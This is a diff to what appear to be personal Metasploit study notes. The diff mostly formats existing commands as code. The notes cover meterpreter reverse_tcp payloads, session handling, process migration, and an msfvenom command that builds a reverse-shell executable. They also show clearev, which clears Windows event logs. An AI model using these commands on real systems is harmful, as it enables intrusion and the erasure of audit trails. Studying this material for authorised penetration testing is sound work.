@@ -5,7 +5,6 @@ Initialize database
 
 msfdb init
 
-
 -q  // no banner
 
 db_status   // db status
@@ -67,14 +66,14 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 run -j     //  (-j run as job)
 
 
-sessions -i <SESSION_NUMBER>
+`sessions -i <SESSION_NUMBER>`
 
 
 after connecting, run ps to view processes
 
 we see spoolsv.exe
 
-migrate <pid>
+`migrate <pid>`
 
 
 doesn't work 
@@ -125,10 +124,10 @@ auxiliary/server/socks5
 
 msfvennom
 
-msfvenom -p <PAYLOAD> <OPTIONS>
+`msfvenom -p <PAYLOAD> <OPTIONS>`
 
 
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 
 
 staged - good for ids detection, first stage just connects, second stage downloads code
@@ -140,7 +139,7 @@ meterpreter shell  -  must be used in msf, banned from certain certifications
 
 
 
-<OS>/<arch>/<payload>
+`<OS>/<arch>/<payload>`
 
 linux/x86/shell_reverse_tcp
 
@@ -151,7 +150,7 @@ backslash = staged
 
 
 
-msfvenom --list payloads | grep "<OS>/<arch>/<payload>"
+`msfvenom --list payloads | grep "<OS>/<arch>/<payload>"`
 
 
 
@@ -164,7 +163,7 @@ to upgrade regular shell to meterpreter shell use
 post/multi/manage/shell_to_meterpreter
 
 
-clearev		 will clear the Application, System, and Security logs on a Windows system.
+`clearev`	 will clear the Application, System, and Security logs on a Windows system.
 
 
 
